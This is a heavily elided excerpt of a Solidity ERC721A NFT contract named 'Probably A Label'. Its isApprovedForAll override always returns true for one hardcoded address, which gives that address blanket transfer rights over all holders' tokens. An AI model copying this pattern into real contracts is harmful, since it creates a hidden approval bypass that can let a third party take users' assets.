  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xC1d31117A6d134dc8f732c0547437cd95626a14a){return true;}
...
contract ProbablyALabel is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Probably A Label", "PAL", maxBatchSize_, collectionSize_) {
